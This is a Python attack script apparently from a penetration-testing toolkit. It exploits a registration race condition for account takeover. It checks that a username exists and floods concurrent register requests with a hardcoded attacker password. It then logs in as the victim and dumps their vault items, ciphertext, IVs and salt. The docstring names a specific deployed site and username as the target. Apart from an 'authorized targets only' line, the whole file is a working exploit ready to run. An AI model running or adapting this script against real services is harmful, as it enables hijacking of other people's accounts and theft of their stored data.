#!/usr/bin/env python3
"""
vault_takeover.py — Registration-race account takeover + vault dump.

Flow (authorized targets only):
  1. Probe register → 409 means username exists
  2. Flood concurrent POST /register with attacker password
  3. Login with attacker password
  4. GET protected items endpoint and print ciphertext blobs

    python TOOLS/vault_takeover.py \
      --url https://vibe-everything2.vercel.app \
      --username xhloe \
      --workers 24

This is the high-power path that beat the hardened Vault demo when
JWT/IDOR/XSS probes did not.
"""
from __future__ import annotations

import argparse
import base64
import concurrent.futures
import json
import sys
import time
import urllib.error
import urllib.request
from collections import Counter


def _req(url: str, method: str = "GET", body: dict | None = None, token: str | None = None,
         timeout: float = 20.0):
    data = None if body is None else json.dumps(body).encode()
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": "VibeHacking-vault_takeover/1.0",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
            try:
                return r.status, json.loads(raw)
            except Exception:
                return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            return e.code, json.loads(raw)
        except Exception:
            return e.code, raw
    except Exception as e:
        return 0, str(e)


def _jwt_payload(tok: str) -> dict:
    try:
        mid = tok.split(".")[1]
        mid += "=" * ((4 - len(mid) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(mid))
    except Exception:
        return {}


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Race-register account takeover + vault dump")
    p.add_argument("--url", required=True, help="Base URL you own / are authorized to test")
    p.add_argument("--username", required=True, help="Target username")
    p.add_argument("--register", default="/api/register")
    p.add_argument("--login", default="/api/login")
    p.add_argument("--items", default="/api/items", help="Authenticated list endpoint")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pass-field", default="password")
    p.add_argument("--attacker-pass", default="HackedByStorm!99xx",
                   help="Password written during race (must meet target policy)")
    p.add_argument("--workers", type=int, default=20)
    p.add_argument("--rounds", type=int, default=1, help="Repeat race rounds if login fails")
    args = p.parse_args(argv)

    base = args.url.rstrip("/")
    reg_url = base + args.register
    login_url = base + args.login
    items_url = base + args.items
    user, apw = args.username, args.attacker_pass

    print("=" * 52)
    print(" VAULT TAKEOVER — race register → login → dump")
    print("=" * 52)
    print(f"[*] target={base}")
    print(f"[*] user={user!r} workers={args.workers} rounds={args.rounds}")

    # 1) exists?
    st, body = _req(reg_url, "POST", {args.user_field: user, args.pass_field: "ProbeOnlyPass!99"})
    if st == 409:
        print(f"[+] username taken (HTTP 409) — account exists")
    elif st in (200, 201):
        print(f"[!] username was free (HTTP {st}) — created by probe; may be empty vault")
        if isinstance(body, dict) and body.get("token"):
            print(f"    probe jwt: {_jwt_payload(body['token'])}")
    else:
        print(f"[-] unexpected register probe: {st} {body}")

    token = None
    for rnd in range(1, args.rounds + 1):
        print(f"\n[*] race round {rnd}/{args.rounds}")

        def race(_):
            return _req(reg_url, "POST", {args.user_field: user, args.pass_field: apw})

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
            results = list(ex.map(race, range(args.workers)))
        counts = Counter(st for st, _ in results)
        print(f"    results: {dict(counts)}")
        wins = sum(1 for st, _ in results if st in (200, 201))
        if wins:
            print(f"    [!] {wins} concurrent register success(es) on existing name")

        st, login = _req(login_url, "POST", {args.user_field: user, args.pass_field: apw})
        print(f"    login attacker password → HTTP {st}")
        if st in (200, 201) and isinstance(login, dict) and login.get("token"):
            token = login["token"]
            print(f"[🔥 HACK] ACCOUNT TAKEOVER — session as {user!r}")
            print(f"    jwt: {_jwt_payload(token)}")
            if "vault_salt" in login:
                print(f"    vault_salt: {login.get('vault_salt')}")
            break
        # fallback: token from race response itself
        for st, body in results:
            if st in (200, 201) and isinstance(body, dict) and body.get("token"):
                token = body["token"]
                print(f"[🔥 HACK] using race-issued token")
                print(f"    jwt: {_jwt_payload(token)}")
                break
        if token:
            break

    if not token:
        print("[-] takeover failed — unique constraint or lock may be in place")
        return 2

    print(f"\n[*] dumping {args.items}")
    st, items = _req(items_url, "GET", token=token)
    print(f"    HTTP {st}")
    print(json.dumps(items, indent=2) if not isinstance(items, str) else items)

    n = 0
    if isinstance(items, dict):
        lst = items.get("items") or items.get("data") or []
        if isinstance(lst, list):
            n = len(lst)
            for it in lst:
                if not isinstance(it, dict):
                    continue
                print(f"  — id={it.get('id')} cat={it.get('category')} label={it.get('label')!r}")
                print(f"    ciphertext={it.get('ciphertext')}")
                print(f"    iv={it.get('iv')}")

    print("\n" + "=" * 52)
    if n:
        print(f"[🔥] TAKEOVER + {n} vault item(s) retrieved")
    else:
        print("[🔥] TAKEOVER OK — vault list empty (no items or wiped by race/uid)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
